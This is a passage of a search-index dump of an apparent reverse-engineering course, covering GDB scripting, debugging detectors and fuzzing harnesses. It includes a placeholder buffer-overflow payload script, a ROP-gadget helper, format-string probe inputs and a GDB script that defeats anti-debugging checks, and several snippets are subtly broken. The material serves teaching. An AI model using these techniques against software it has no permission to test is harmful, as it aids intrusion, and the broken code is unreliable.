checks\n(gdb) set environment TZ=UTC   # Consistent timing\n(gdb) handle SIGALRM ignore    # Ignore alarm signals\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#custom-gdb-scripts-and-automation","title":"Custom GDB Scripts and Automation","text":""},{"location":"reverse-engineering/dynamic/01-gdb-basics/#exploit-development-script","title":"Exploit Development Script","text":"<pre><code># exploit_helper.py\nimport gdb\nimport struct\n\nclass ExploitHelper(gdb.Command):\n    def __init__(self):\n        super(ExploitHelper, self).__init__(\"exploit-helper\", gdb.COMMAND_USER)\n\n    def invoke(self, arg, from_tty):\n        args = arg.split()\n        if not args:\n            self.show_help()\n            return\n\n        cmd = args[0]\n\n        if cmd == \"find-offset\":\n            self.find_buffer_offset()\n        elif cmd == \"find-gadgets\":\n            self.find_rop_gadgets()\n        elif cmd == \"leak-stack\":\n            self.leak_stack_values()\n\n    def find_buffer_offset(self):\n        \"\"\"Find buffer overflow offset\"\"\"\n        try:\n            rip = int(gdb.parse_and_eval(\"$rip\"))\n            print(f\"RIP: 0x{rip:016x}\")\n\n            # Check if RIP looks like pattern\n            if 0x4141414141414141 &lt;= rip &lt;= 0x4242424242424242:\n                print(\"Controlled RIP detected!\")\n        except:\n            print(\"Could not analyze RIP\")\n\n    def find_rop_gadgets(self):\n        \"\"\"Find simple ROP gadgets\"\"\"\n        # Search for common gadgets\n        gadgets = [b'\\x5f\\xc3',  # pop rdi; ret\n                  b'\\x5e\\xc3',  # pop rsi; ret\n                  b'\\xc3']      # ret\n\n        print(\"Searching for ROP gadgets...\")\n        # Implementation would search memory for these patterns\n\n    def leak_stack_values(self):\n        \"\"\"Show stack values\"\"\"\n        try:\n            rsp = int(gdb.parse_and_eval(\"$rsp\"))\n            print(\"Stack values:\")\n            for i in range(10):\n                addr = rsp + i * 8\n                try:\n                    value = gdb.parse_and_eval(f\"*(long*)0x{addr:x}\")\n                    print(f\"0x{addr:016x}: 0x{int(value):016x}\")\n                except:\n                    break\n        except:\n            print(\"Could not read stack\")\n\n    def show_help(self):\n        print(\"Usage: exploit-helper &lt;command&gt;\")\n        print(\"Commands:\")\n        print(\"  find-offset  - Find buffer overflow offset\")\n        print(\"  find-gadgets - Search for ROP gadgets\")\n        print(\"  leak-stack   - Show stack values\")\n\nExploitHelper()\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#automated-vulnerability-detection","title":"Automated Vulnerability Detection","text":"<pre><code># vuln_detect.gdb\ndefine check_dangerous_functions\n    # Check for gets\n    if $_streq((char*)$arg0, \"gets\")\n        printf \"WARNING: gets() detected - buffer overflow risk\\n\"\n    end\n\n    # Check for strcpy\n    if $_streq((char*)$arg0, \"strcpy\") \n        printf \"WARNING: strcpy() detected - buffer overflow risk\\n\"\n    end\nend\n\n# Hook function calls\nbreak *__libc_start_main\ncommands\n    printf \"Program started, setting up hooks...\\n\"\n    break gets\n    commands\n        printf \"gets() called with buffer at %p\\n\", $rdi\n        continue\n    end\n    continue\nend\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#integration-with-exploit-development","title":"Integration with Exploit Development","text":""},{"location":"reverse-engineering/dynamic/01-gdb-basics/#pwntools-gdb","title":"pwntools + GDB","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ncontext.terminal = ['tmux', 'splitw', '-h']\n\ndef debug_exploit():\n    # Start with GDB attached\n    p = gdb.debug('./target', '''\n        set disassembly-flavor intel\n        break vulnerable_function\n        break *vulnerable_function+50\n        continue\n    ''')\n\n    # Wait for GDB to attach\n    raw_input(\"Press enter when ready...\")\n\n    # Send exploit payload\n    payload = b'A' * 72 + p64(0x400000)\n    p.sendline(payload)\n    p.interactive()\n\ndebug_exploit()\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#live-debugging-session","title":"Live Debugging Session","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef interactive_debug():\n    p = process('./target')\n\n    # Attach GDB to running process\n    gdb.attach(p, '''\n        set disassembly-flavor intel\n        break vulnerable_function\n        continue\n    ''')\n\n    # Continue with normal exploitation\n    p.sendline(b'trigger')\n    p.interactive()\n\ninteractive_debug()\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#best-practices","title":"Best Practices","text":""},{"location":"reverse-engineering/dynamic/01-gdb-basics/#debugging-workflow","title":"Debugging Workflow","text":"<ol> <li>Set up environment - Configure GDB with PEDA/Pwndbg</li> <li>Static analysis first - Understand program structure</li> <li>Set strategic breakpoints - Function entries, dangerous calls</li> <li>Trace execution - Follow program flow</li> <li>Analyze crash state - Examine registers and stack</li> <li>Develop exploit - Use findings to build payload</li> </ol>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#common-gdb-configurations","title":"Common GDB Configurations","text":"<pre><code># ~/.gdbinit\nset disassembly-flavor intel\nset pagination off\nset confirm off\nset verbose off\nset print pretty on\nset print array on\nset print array-indexes on\nset python print-stack full\n\n# Custom aliases\nalias assemble = set language asm\nalias ctx = context\nalias telescope = telescope\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#security-focused-analysis","title":"Security-focused Analysis","text":"<pre><code># Check for security features\n(gdb) checksec\n\n# Find system calls\n(gdb) catch syscall write\n(gdb) catch syscall execve\n\n# Monitor library calls\n(gdb) break printf\n(gdb) break malloc\n(gdb) break free\n</code></pre>"},{"location":"reverse-engineering/dynamic/01-gdb-basics/#key-takeaways","title":"Key Takeaways","text":"<p>GDB Fundamentals</p> <ul> <li>Enhanced GDB (PEDA/Pwndbg) provides essential features for exploit development</li> <li>Context awareness helps understand program state quickly</li> <li>Pattern generation simplifies offset finding</li> <li>Memory search capabilities aid in analysis</li> <li>Automation through scripting increases efficiency</li> </ul> <p>Debugging Best Practices</p> <ul> <li>Start with static analysis before dynamic debugging</li> <li>Use strategic breakpoints rather than stepping through everything</li> <li>Learn keyboard shortcuts for common operations</li> <li>Practice with simple programs before complex targets</li> <li>Document findings and create reproducible scripts</li> </ul> <p>Common Pitfalls</p> <ul> <li>ASLR can change addresses between runs</li> <li>Debugger presence may alter program behavior</li> <li>Stack layout differs between debugged and normal execution</li> <li>Some anti-debugging techniques detect GDB</li> <li>Memory corruption may not be immediately visible</li> </ul> <p>Next: Debugging Techniques</p>"},{"location":"reverse-engineering/dynamic/02-debugging/","title":"Debugging Techniques","text":"<p>Advanced debugging techniques are essential for understanding program behavior, finding vulnerabilities, and developing exploits. This section covers sophisticated debugging strategies and methodologies.</p>"},{"location":"reverse-engineering/dynamic/02-debugging/#advanced-gdb-techniques","title":"Advanced GDB Techniques","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#conditional-breakpoints","title":"Conditional Breakpoints","text":"<pre><code># Break only when specific conditions are met\nbreak main if argc &gt; 2\nbreak malloc if $rdi &gt; 1000\nbreak strcpy if strcmp($rsi, \"admin\") == 0\n\n# Complex conditions\nbreak *0x400123 if $rax == 0x41414141 &amp;&amp; $rbx != 0\n\n# Break on memory access patterns\nbreak *0x400456 if *((int*)$rsp) == 0x12345678\n\n# Break after N hits\nbreak main\nignore 1 10  # Ignore first 10 hits\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#watchpoints-and-memory-monitoring","title":"Watchpoints and Memory Monitoring","text":"<pre><code># Watch memory locations\nwatch *0x601040                    # Break when value changes\nwatch *(int*)($rsp+8)             # Watch stack location\nrwatch *0x601040                  # Break on read access\nawatch *0x601040                  # Break on any access\n\n# Watch expressions\nwatch global_variable\nwatch my_struct.field\nwatch array[index]\n\n# Hardware watchpoints (limited number)\nhbreak *0x400123                  # Hardware breakpoint\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#advanced-memory-examination","title":"Advanced Memory Examination","text":"<pre><code># Examine memory with different formats\nx/20x $rsp                        # 20 hex words\nx/10i $rip                        # 10 instructions\nx/s $rdi                          # String at RDI\nx/20c $rsi                        # 20 characters\n\n# Memory dumps with context\ndefine dump_stack\n    printf \"Stack dump around RSP:\\n\"\n    x/20gx $rsp-40\nend\n\n# Compare memory regions\ndefine compare_memory\n    set $addr1 = $arg0\n    set $addr2 = $arg1\n    set $size = $arg2\n\n    set $i = 0\n    while $i &lt; $size\n        set $val1 = *((char*)$addr1 + $i)\n        set $val2 = *((char*)$addr2 + $i)\n        if $val1 != $val2\n            printf \"Diff at offset %d: 0x%02x vs 0x%02x\\n\", $i, $val1, $val2\n        end\n        set $i = $i + 1\n    end\nend\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#dynamic-analysis-strategies","title":"Dynamic Analysis Strategies","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#function-call-tracing","title":"Function Call Tracing","text":"<pre><code>#!/usr/bin/env python3\nfrom pwn import *\n\ndef trace_function_calls():\n    \"\"\"Trace all function calls in a program\"\"\"\n\n    gdb_script = '''\n    set pagination off\n    set logging file trace.log\n    set logging on\n\n    # Break on all function calls\n    catch syscall\n\n    # Custom tracer for function entries\n    define trace_call\n        printf \"CALL: %s at %p\\\\n\", $arg0, $rip\n        printf \"  Args: RDI=%p RSI=%p RDX=%p\\\\n\", $rdi, $rsi, $rdx\n        backtrace 3\n        printf \"\\\\n\"\n    end\n\n    # Hook common functions\n    break malloc\n    commands\n        trace_call \"malloc\"\n        continue\n    end\n\n    break free\n    commands\n        trace_call \"free\"\n        continue\n    end\n\n    break strcpy\n    commands\n        printf \"strcpy(dest=%p, src=\\\\\"%s\\\\\")\\\\n\", $rdi, $rsi\n        continue\n    end\n\n    run\n    '''\n\n    p = gdb.debug('./target', gdb_script)\n    return p\n\ndef automated_function_discovery():\n    \"\"\"Automatically discover and trace interesting functions\"\"\"\n\n    elf = ELF('./target')\n    functions_to_trace = []\n\n    # Find functions with interesting names\n    interesting_patterns = [\n        'auth', 'login', 'pass', 'crypt', 'hash',\n        'validate', 'check', 'verify', 'admin',\n        'key', 'token', 'secret'\n    ]\n\n    for symbol, addr in elf.symbols.items():\n        for pattern in interesting_patterns:\n            if pattern in symbol.lower():\n                functions_to_trace.append((symbol, addr))\n\n    # Generate GDB script to trace these functions\n    gdb_script = 'set pagination off\\n'\n\n    for func_name, func_addr in functions_to_trace:\n        gdb_script += f'''\nbreak *{hex(func_addr)}\ncommands\n    printf \"&gt;&gt;&gt; {func_name} called at %p\\\\n\", $rip\n    printf \"    Args: %p %p %p %p\\\\n\", $rdi, $rsi, $rdx, $rcx\n    continue\nend\n'''\n\n    gdb_script += 'run\\n'\n\n    return gdb_script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#data-flow-analysis","title":"Data Flow Analysis","text":"<pre><code>#!/usr/bin/env python3\n\ndef trace_data_flow():\n    \"\"\"Trace how data flows through the program\"\"\"\n\n    gdb_script = '''\n    # Track a specific value through execution\n    set $target_value = 0x41414141\n    set $trace_active = 0\n\n    define check_registers\n        if $rax == $target_value\n            printf \"Target value found in RAX at %p\\\\n\", $rip\n            set $trace_active = 1\n        end\n        if $rbx == $target_value\n            printf \"Target value found in RBX at %p\\\\n\", $rip  \n            set $trace_active = 1\n        end\n        # Check other registers...\n    end\n\n    # Hook every instruction when tracing is active\n    define trace_instruction\n        if $trace_active\n            printf \"TRACE: %p \", $rip\n            x/i $rip\n            check_registers\n        end\n    end\n\n    # Enable single-step tracing\n    break main\n    commands\n        printf \"Starting data flow trace for value 0x%x\\\\n\", $target_value\n        continue\n    end\n    '''\n\n    return gdb_script\n\ndef memory_corruption_detector():\n    \"\"\"Detect memory corruption in real-time\"\"\"\n\n    gdb_script = '''\n    # Set up corruption detection\n    set $canary_value = 0xdeadbeefcafebabe\n    set $canary_addr = 0\n\n    # Hook malloc to set up canaries\n    break malloc\n    commands\n        finish\n        set $canary_addr = $rax + $arg0\n        set *((long*)$canary_addr) = $canary_value\n        printf \"Canary set at %p (after %d bytes)\\\\n\", $canary_addr, $arg0\n        continue\n    end\n\n    # Check canaries periodically\n    break strcpy\n    commands\n        if $canary_addr != 0\n            if *((long*)$canary_addr) != $canary_value\n                printf \"CORRUPTION DETECTED! Canary overwritten\\\\n\"\n                printf \"Expected: 0x%lx, Found: 0x%lx\\\\n\", $canary_value, *((long*)$canary_addr)\n                backtrace\n            end\n        end\n        continue\n    end\n    '''\n\n    return gdb_script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#multi-threaded-debugging","title":"Multi-threaded Debugging","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#thread-specific-debugging","title":"Thread-specific Debugging","text":"<pre><code># List all threads\ninfo threads\n\n# Switch between threads\nthread 2\nthread apply all bt    # Backtrace all threads\n\n# Thread-specific breakpoints\nbreak thread_function thread 3\nbreak main if $_thread == 2\n\n# Lock scheduler to current thread\nset scheduler-locking on\n\n# Continue specific thread\nthread apply 2 continue\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#race-condition-detection","title":"Race Condition Detection","text":"<pre><code>#!/usr/bin/env python3\n\ndef detect_race_conditions():\n    \"\"\"Set up debugging to catch race conditions\"\"\"\n\n    gdb_script = '''\n    set pagination off\n    set non-stop on\n    set target-async on\n\n    # Track shared resource access\n    set $shared_resource = 0x601040\n    set $access_count = 0\n\n    # Hook shared resource access\n    watch *$shared_resource\n    commands\n        set $access_count = $access_count + 1\n        printf \"Thread %d accessing shared resource (access #%d)\\\\n\", $_thread, $access_count\n        printf \"Value: 0x%x at %p\\\\n\", *$shared_resource, $shared_resource\n\n        # Check for concurrent access\n        info threads\n\n        # Brief pause to increase chance of detecting races\n        shell sleep 0.1\n        continue\n    end\n\n    # Monitor critical section entries\n    break pthread_mutex_lock\n    commands\n        printf \"Thread %d acquiring mutex\\\\n\", $_thread\n        continue\n    end\n\n    break pthread_mutex_unlock  \n    commands\n        printf \"Thread %d releasing mutex\\\\n\", $_thread\n        continue\n    end\n    '''\n\n    return gdb_script\n\ndef deadlock_detector():\n    \"\"\"Detect potential deadlocks\"\"\"\n\n    gdb_script = '''\n    # Track mutex operations\n    set $mutex_count = 0\n    set $waiting_threads = 0\n\n    break pthread_mutex_lock\n    commands\n        set $mutex_count = $mutex_count + 1\n        printf \"Thread %d waiting for mutex (%d total locks)\\\\n\", $_thread, $mutex_count\n\n        # If too many threads waiting, possible deadlock\n        if $mutex_count &gt; 3\n            printf \"POTENTIAL DEADLOCK: %d threads waiting\\\\n\", $mutex_count\n            info threads\n            thread apply all bt\n        end\n        continue\n    end\n\n    break pthread_mutex_unlock\n    commands\n        set $mutex_count = $mutex_count - 1\n        printf \"Thread %d released mutex (%d remaining)\\\\n\", $_thread, $mutex_count\n        continue\n    end\n    '''\n\n    return gdb_script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#heap-debugging","title":"Heap Debugging","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#heap-corruption-detection","title":"Heap Corruption Detection","text":"<pre><code>#!/usr/bin/env python3\n\ndef heap_corruption_monitor():\n    \"\"\"Monitor heap for corruption\"\"\"\n\n    gdb_script = '''\n    # Track heap allocations\n    set $heap_chunks = 0\n\n    # Hook malloc/free\n    break malloc\n    commands\n        set $size = $rdi\n        finish\n        set $ptr = $rax\n        set $heap_chunks = $heap_chunks + 1\n\n        printf \"MALLOC: %p (size: %d) [chunk #%d]\\\\n\", $ptr, $size, $heap_chunks\n\n        # Set up heap metadata checking\n        # Store size before user data for checking\n        set *((long*)($ptr - 8)) = $size\n        continue\n    end\n\n    break free\n    commands\n        set $ptr = $rdi\n        printf \"FREE: %p\\\\n\", $ptr\n\n        # Check if pointer looks valid\n        if $ptr &lt; 0x100000\n            printf \"SUSPICIOUS: Freeing low address %p\\\\n\", $ptr\n        end\n\n        # Check heap metadata\n        set $stored_size = *((long*)($ptr - 8))\n        printf \"Stored size: %d\\\\n\", $stored_size\n\n        continue\n    end\n\n    # Monitor heap-related functions\n    break realloc\n    commands\n        printf \"REALLOC: %p -&gt; size %d\\\\n\", $rdi, $rsi\n        continue\n    end\n    '''\n\n    return gdb_script\n\ndef use_after_free_detector():\n    \"\"\"Detect use-after-free vulnerabilities\"\"\"\n\n    gdb_script = '''\n    # Poison freed memory\n    set $poison_value = 0xdeadbeefdeadbeef\n\n    break free\n    commands\n        set $ptr = $rdi\n        set $size = *((long*)($ptr - 8))  # Assume size stored before data\n\n        printf \"Poisoning freed memory at %p (size: %d)\\\\n\", $ptr, $size\n\n        # Fill freed memory with poison value\n        set $i = 0\n        while $i &lt; $size / 8\n            set *((long*)($ptr + $i * 8)) = $poison_value\n            set $i = $i + 1\n        end\n\n        continue\n    end\n\n    # Check for access to poisoned memory\n    break *read_function\n    commands\n        set $addr = $rdi\n        if *((long*)$addr) == $poison_value\n            printf \"USE-AFTER-FREE DETECTED: Reading poisoned memory at %p\\\\n\", $addr\n            backtrace\n        end\n        continue\n    end\n    '''\n\n    return gdb_script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#custom-debugging-tools","title":"Custom Debugging Tools","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#dynamic-taint-analysis","title":"Dynamic Taint Analysis","text":"<pre><code>#!/usr/bin/env python3\n\nclass TaintTracker:\n    def __init__(self):\n        self.tainted_addresses = set()\n        self.taint_sources = {}\n\n    def generate_gdb_script(self):\n        \"\"\"Generate GDB script for taint tracking\"\"\"\n\n        script = '''\n# Taint tracking implementation\nset $taint_enabled = 1\n\n# Source: user input functions\nbreak scanf\ncommands\n    if $taint_enabled\n        printf \"TAINT SOURCE: scanf input at %p\\\\n\", $rsi\n        # Mark buffer as tainted\n        call mark_tainted($rsi, strlen($rsi))\n    end\n    continue\nend\n\nbreak fgets\ncommands\n    if $taint_enabled\n        printf \"TAINT SOURCE: fgets input at %p\\\\n\", $rdi\n        call mark_tainted($rdi, $rdx)\n    end\n    continue\nend\n\n# Propagation: string operations\nbreak strcpy\ncommands\n    if $taint_enabled &amp;&amp; is_tainted($rsi)\n        printf \"TAINT PROPAGATION: strcpy %p -&gt; %p\\\\n\", $rsi, $rdi\n        call mark_tainted($rdi, strlen($rsi))\n    end\n    continue\nend\n\n# Sink: dangerous functions\nbreak system\ncommands\n    if $taint_enabled &amp;&amp; is_tainted($rdi)\n        printf \"TAINT SINK: system() called with tainted data!\\\\n\"\n        printf \"Command: %s\\\\n\", $rdi\n        backtrace\n    end\n    continue\nend\n'''\n\n        return script\n\ndef function_coverage_tracker():\n    \"\"\"Track function coverage during execution\"\"\"\n\n    script = '''\n    # Function coverage tracking\n    set $coverage_count = 0\n    set logging file coverage.log\n    set logging on\n\n    # Hook function entries\n    define track_function\n        set $coverage_count = $coverage_count + 1\n        printf \"COVERAGE[%d]: %s at %p\\\\n\", $coverage_count, $arg0, $rip\n    end\n\n    # Auto-generate hooks for all functions\n    python\nimport gdb\n\n# Get all function symbols\nframe = gdb.selected_frame()\ninf = gdb.selected_inferior()\n\nfor symbol in gdb.lookup_global_symbol(\"main\").symtab.linetable():\n    if symbol.is_function:\n        addr = symbol.value().address\n        name = symbol.name\n\n        # Create breakpoint\n        bp = gdb.Breakpoint(f\"*{addr}\")\n        bp.commands = f'track_function \"{name}\"\\\\ncontinue'\n\nend\n    '''\n\n    return script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#performance-profiling","title":"Performance Profiling","text":"<pre><code>#!/usr/bin/env python3\n\ndef performance_profiler():\n    \"\"\"Profile function execution times\"\"\"\n\n    script = '''\n    # Performance profiling\n    set $prof_enabled = 1\n    set $prof_start_time = 0\n    set $prof_function_times = 0\n\n    define start_timer\n        if $prof_enabled\n            shell date +%s%N &gt; /tmp/gdb_timer\n            set $prof_start_time = system(\"cat /tmp/gdb_timer\")\n        end\n    end\n\n    define end_timer\n        if $prof_enabled\n            shell date +%s%N &gt; /tmp/gdb_timer  \n            set $end_time = system(\"cat /tmp/gdb_timer\")\n            set $duration = $end_time - $prof_start_time\n            printf \"Function duration: %d nanoseconds\\\\n\", $duration\n        end\n    end\n\n    # Profile specific functions\n    break expensive_function\n    commands\n        start_timer\n        finish\n        end_timer\n        continue\n    end\n\n    # Profile memory allocations\n    break malloc\n    commands\n        start_timer\n        finish\n        end_timer\n        printf \"malloc(%d) took time above\\\\n\", $arg0\n        continue\n    end\n    '''\n\n    return script\n\ndef bottleneck_analyzer():\n    \"\"\"Analyze performance bottlenecks\"\"\"\n\n    script = '''\n    # Bottleneck analysis\n    set $call_counts = 0\n    set $total_calls = 0\n\n    # Count function calls\n    define count_calls\n        set $call_counts = $call_counts + 1\n        set $total_calls = $total_calls + 1\n\n        # Report every 1000 calls\n        if $call_counts &gt;= 1000\n            printf \"Performance report: %d total calls\\\\n\", $total_calls\n            set $call_counts = 0\n        end\n    end\n\n    # Hook frequently called functions\n    break strlen\n    commands\n        count_calls\n        continue\n    end\n\n    break malloc\n    commands  \n        count_calls\n        printf \"malloc overhead detected\\\\n\"\n        continue\n    end\n\n    # Detect infinite loops\n    break *loop_start\n    commands\n        set $loop_count = $loop_count + 1\n        if $loop_count &gt; 10000\n            printf \"POTENTIAL INFINITE LOOP: %d iterations\\\\n\", $loop_count\n            backtrace\n        end\n        continue\n    end\n    '''\n\n    return script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#reverse-engineering-specific-techniques","title":"Reverse Engineering Specific Techniques","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#anti-debugging-bypass","title":"Anti-debugging Bypass","text":"<pre><code>#!/usr/bin/env python3\n\ndef bypass_anti_debugging():\n    \"\"\"Bypass common anti-debugging techniques\"\"\"\n\n    script = '''\n    # Bypass IsDebuggerPresent\n    break IsDebuggerPresent\n    commands\n        finish\n        set $rax = 0\n        printf \"Bypassed IsDebuggerPresent\\\\n\"\n        continue\n    end\n\n    # Bypass timing checks\n    break GetTickCount\n    commands\n        finish\n        # Return consistent time\n        set $rax = 1000000\n        printf \"Bypassed timing check\\\\n\"\n        continue\n    end\n\n    # Bypass NtQueryInformationProcess\n    break NtQueryInformationProcess\n    commands\n        if $rsi == 7  # ProcessDebugPort\n            finish\n            set $rax = 0  # No debug port\n            printf \"Bypassed ProcessDebugPort check\\\\n\"\n        end\n        continue\n    end\n\n    # Handle SIGTRAP\n    handle SIGTRAP noprint nostop pass\n\n    # Handle hardware breakpoint detection\n    break ptrace\n    commands\n        if $rdi == 0  # PTRACE_TRACEME\n            finish\n            set $rax = 0  # Success\n            printf \"Bypassed ptrace detection\\\\n\"\n        end\n        continue\n    end\n    '''\n\n    return script\n\ndef crypto_analysis_setup():\n    \"\"\"Set up debugging for cryptographic analysis\"\"\"\n\n    script = '''\n    # Crypto function hooking\n    set pagination off\n    set logging file crypto_trace.log\n    set logging on\n\n    # Common crypto functions\n    break AES_encrypt\n    commands\n        printf \"AES_encrypt called\\\\n\"\n        printf \"  Input: \"\n        x/16bx $rdi\n        printf \"  Key: \"  \n        x/16bx $rsi\n        finish\n        printf \"  Output: \"\n        x/16bx $rdi\n        continue\n    end\n\n    break MD5_Update\n    commands\n        printf \"MD5_Update: data at %p, len=%d\\\\n\", $rsi, $rdx\n        if $rdx &lt;= 64\n            printf \"  Data: \"\n            x/bx $rsi\n        end\n        continue\n    end\n\n    # Look for crypto constants\n    break *crypto_function\n    commands\n        # Check for known crypto constants\n        if $rax == 0x67452301  # MD5 constant\n            printf \"MD5 constant detected\\\\n\"\n        end\n        if $rax == 0x6A09E667  # SHA256 constant\n            printf \"SHA256 constant detected\\\\n\"\n        end\n        continue\n    end\n    '''\n\n    return script\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#automation-and-scripting","title":"Automation and Scripting","text":""},{"location":"reverse-engineering/dynamic/02-debugging/#automated-vulnerability-discovery","title":"Automated Vulnerability Discovery","text":"<pre><code>#!/usr/bin/env python3\n\nclass VulnFinder:\n    def __init__(self, binary_path):\n        self.binary_path = binary_path\n        self.vulnerabilities = []\n\n    def generate_fuzzing_script(self):\n        \"\"\"Generate GDB script for automated fuzzing\"\"\"\n\n        script = '''\n    # Automated vulnerability discovery\n    set pagination off\n    set $crash_count = 0\n    set $test_count = 0\n\n    define fuzz_test\n        set $test_count = $test_count + 1\n        printf \"Fuzz test #%d\\\\n\", $test_count\n\n        # Generate random input\n        python\nimport random\nimport string\n\n# Generate random string\nlength = random.randint(1, 1000)\nchars = string.ascii_letters + string.digits + string.punctuation\ntest_input = ''.join(random.choice(chars) for _ in range(length))\n\n# Write to file for program input\nwith open('/tmp/fuzz_input', 'w') as f:\n    f.write(test_input)\n\ngdb.execute(f'run &lt; /tmp/fuzz_input')\nend\n    end\n\n    # Handle crashes\n    define handle_crash\n        set $crash_count = $crash_count + 1\n        printf \"CRASH #%d detected!\\\\n\", $crash_count\n\n        # Log crash info\n        printf \"RIP: %p\\\\n\", $rip\n        printf \"RSP: %p\\\\n\", $rsp\n        backtrace\n\n        # Check crash type\n        if $rip &gt; 0x7f0000000000\n            printf \"Crash in library code\\\\n\"\n        else\n            printf \"Crash in main binary\\\\n\"\n        end\n\n        # Save core dump\n        generate-core-file\n\n        # Continue fuzzing\n        fuzz_test\n    end\n\n    # Start fuzzing\n    signal SIGSEGV handle_crash\n    signal SIGBUS handle_crash\n    signal SIGFPE handle_crash\n\n    fuzz_test\n    '''\n\n        return script\n\n    def stack_overflow_detector(self):\n        \"\"\"Specific stack overflow detection\"\"\"\n\n        script = '''\n    # Stack overflow detection\n    set $stack_start = $rsp\n    set $stack_size = 0x2000  # 8KB stack window\n\n    # Monitor stack growth\n    define check_stack\n        set $current_stack = $rsp\n        set $stack_used = $stack_start - $current_stack\n\n        if $stack_used &gt; $stack_size\n            printf \"LARGE STACK USAGE: %d bytes\\\\n\", $stack_used\n            backtrace 10\n        end\n\n        # Check for stack smashing\n        set $canary_addr = $rbp + 8\n        if *((long*)$canary_addr) != $original_canary\n            printf \"STACK SMASHING DETECTED!\\\\n\"\n            printf \"Canary: expected %p, found %p\\\\n\", $original_canary, *((long*)$canary_addr)\n            backtrace\n        end\n    end\n\n    # Hook function entries/exits\n    break *main\n    commands\n        set $original_canary = *((long*)($rbp + 8))\n        printf \"Original canary: %p\\\\n\", $original_canary\n        continue\n    end\n\n    # Check on every function call\n    break *\n    commands\n        check_stack\n        continue\n    end\n    '''\n\n        return script\n\ndef create_debug_harness():\n    \"\"\"Create comprehensive debugging harness\"\"\"\n\n    harness = '''\n#!/usr/bin/env python3\nfrom pwn import *\nimport sys\n\nclass DebugHarness:\n    def __init__(self, binary_path):\n        self.binary = binary_path\n        self.context = context\n        self.context.log_level = 'debug'\n\n    def run_with_input(self, test_input):\n        \"\"\"Run binary with specific input and monitor for issues\"\"\"\n        try:\n            p = process(self.binary)\n            p.sendline(test_input)\n\n            # Wait for completion or timeout\n            output = p.recvall(timeout=5)\n            p.close()\n\n            return {\n                'success': True,\n                'output': output,\n                'crashed': False\n            }\n\n        except Exception as e:\n            return {\n                'success': False,\n                'output': None,\n                'crashed': True,\n                'error': str(e)\n            }\n\n    def test_buffer_overflow(self):\n        \"\"\"Test for buffer overflow vulnerabilities\"\"\"\n        print(\"Testing for buffer overflows...\")\n\n        for size in [100, 200, 500, 1000, 2000, 5000]:\n            test_input = b'A' * size\n            result = self.run_with_input(test_input)\n\n            if result['crashed']:\n                print(f\"CRASH detected with {size} bytes!\")\n                return size\n\n        return None\n\n    def test_format_string(self):\n        \"\"\"Test for format string vulnerabilities\"\"\"\n        print(\"Testing for format string bugs...\")\n\n        format_strings = [\n            b'%x' * 10,\n            b'%s' * 5,\n            b'%n',\n            b'%p' * 20,\n            b'AAAA' + b'%x' * 10\n        ]\n\n        for fmt_str in format_strings:\n            result = self.run_with_input(fmt_str)\n\n            if result['success'] and result['output']:\n                if b'41414141' in result['output']:  # Our AAAA marker\n                    print(\"Format string vulnerability detected!\")\n                    return True\n\n        return False\n\nif __name__ == '__main__':\n    if len(sys.argv) != 2:\n        print(\"Usage: debug_harness.py &lt;binary&gt;\")\n        sys.exit(1)\n\n    harness = DebugHarness(sys.argv[1])\n\n    # Run tests\n    overflow_size = harness.test_buffer_overflow()\n    format_vuln = harness.test_format_string()\n\n    print(f\"\\\\nResults:\")\n    print(f\"Buffer overflow: {'Yes' if overflow_size else 'No'}\")\n    if overflow_size:\n        print(f\"  Crashes at {overflow_size} bytes\")\n    print(f\"Format string: {'Yes' if format_vuln else 'No'}\")\n'''\n\n    return harness\n</code></pre>"},{"location":"reverse-engineering/dynamic/02-debugging/#key-takeaways","title":"Key Takeaways","text":"<p>Advanced Debugging Fundamentals</p> <ul> <li>Conditional breakpoints save time by breaking only when needed</li> <li>Watchpoints help track memory corruption and data flow</li> <li>Multi-threaded debugging requires special techniques for race conditions</li> <li>Automation increases efficiency for repetitive analysis tasks</li> <li>Custom scripts can detect specific vulnerability patterns</li> </ul> <p>Debugging Best Practices</p> <ul> <li>Use logging to capture debugging sessions for later analysis</li> <li>Combine static and dynamic analysis for complete understanding</li> <li>Automate repetitive debugging tasks with custom scripts</li> <li>Use watchpoints sparingly as they can slow execution significantly</li> <li>Practice with simple programs before tackling complex binaries</li> </ul> <p>Common Debugging Challenges</p> <ul> <li>Anti-debugging techniques can interfere with analysis</li> <li>Optimized code may behave differently than source suggests</li> <li>Threading issues can be non-deterministic and hard to reproduce</li> <li>Large programs may require selective debugging of specific components</li> <li>Memory corruption can cause delayed crashes far from the root cause</li> </ul> <p>Next: Binary Patching</p>"},{"location":"reverse-engineering/dynamic/03-patching/","title":"Binary Patching","text":"<p>Binary patching involves modifying executable files to change their behavior without access to source code. This technique is essential for bypassing protections, fixing bugs, and understanding program logic.</p>"},{"location":"reverse-engineering/dynamic/03-patching/#patching-fundamentals","title":"Patching Fundamentals","text":""},{"location":"reverse-engineering/dynamic/03-patching/#types-of-patches","title":"Types of 